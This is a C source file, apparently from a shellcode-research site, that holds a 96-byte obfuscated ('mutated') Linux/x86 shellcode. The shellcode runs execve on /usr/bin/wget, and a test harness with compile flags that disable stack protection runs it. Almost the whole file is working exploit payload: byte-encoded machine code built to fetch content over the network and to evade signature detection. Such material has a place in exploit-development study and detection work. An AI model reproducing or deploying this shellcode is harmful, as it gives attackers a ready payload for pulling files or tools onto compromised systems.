/*

   Mutated Execve Wget Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   mutated_execve_wget_shellcode

   * 96 bytes
   * null-free
   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)


  # gcc -m32 -fno-stack-protector -z execstack mutated_execve_wget_shellcode.c -o mutated_execve_wget_shellcode

  Testing
  # ./mutated_execve_wget_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\xeb\x01\xe8\x29\xdb\x74\x01\x83\xf7\xe3"
              "\xbd\xf5\xff\xff\xff\xeb\x01\xe8\x68\x41"
              "\x65\x45\x72\x29\xf6\x74\x01\x83\x5e\x56"
              "\x81\xf6\x25\x4a\x1f\x3e\x56\xeb\x01\x33"
              "\x68\x69\x73\x2e\x67\x89\x44\x24\x0c\x89"
              "\xe1\x6a\x74\xeb\x01\xe3\x68\x2f\x77\x67"
              "\x65\xeb\x01\x83\x68\x2f\x62\x69\x6e\xeb"
              "\x01\x33\x68\x2f\x75\x73\x72\x8d\x1c\x24"
              "\xeb\x01\x83\x50\x51\x53\x89\xe1\xf7\xdd"
              "\x95\xeb\x01\x83\xcd\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}